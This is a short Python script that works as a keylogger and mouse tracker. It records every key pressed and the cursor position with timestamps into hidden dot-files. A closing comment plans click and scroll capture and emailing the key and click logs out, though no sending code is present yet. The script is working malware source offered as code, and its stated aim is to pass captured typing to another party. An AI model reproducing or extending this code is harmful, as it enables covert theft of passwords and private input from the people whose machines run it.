import keyboard
import pyautogui
import time
import threading
import datetime

def recordKeys():
    while True:
        event = keyboard.record('enter')
        with open('.keys.txt', 'a') as file:
            for e in event:
                if e.event_type == 'down':
                    clocktime = datetime.datetime.now().strftime("%r")
                    file.write(f"'{e.name}'  At {clocktime}\n'")
            


def mouseMonitor():
    size = pyautogui.size()
    with open('.mouse.txt', 'w') as file:
        file.write(f"Size: {size.width}x{size.height} \n")
    
    while True:
        position = pyautogui.position()
        with open('.mouse.txt', 'a') as file:
            clocktime = datetime.datetime.now().strftime("%r")
            file.write(f"Mouse Position: X: {position.x}   Y:{position.y}  At {clocktime}\n")
            time.sleep(0.2)


if __name__ == "__main__":
    print("Hello user...")
    print("I want to record some keys from your keyboard")
    # time.sleep(3)
    keyboardThread = threading.Thread(target=recordKeys)
    mouseThread = threading.Thread(target=mouseMonitor)

    keyboardThread.start()
    mouseThread.start()
    keyboardThread.join()
    mouseThread.join()





# if i have to write soemthing on the user console then use the pyautogui.write function instead of keyboard.write (use keyboard.wrte to get a feel like chatgpt is writing in the console)


# Implementation: Add the mouse monitoring so whenever user clicks, the mouse position got noted, also add this for scrolling, and sending the key logs and click logs via mail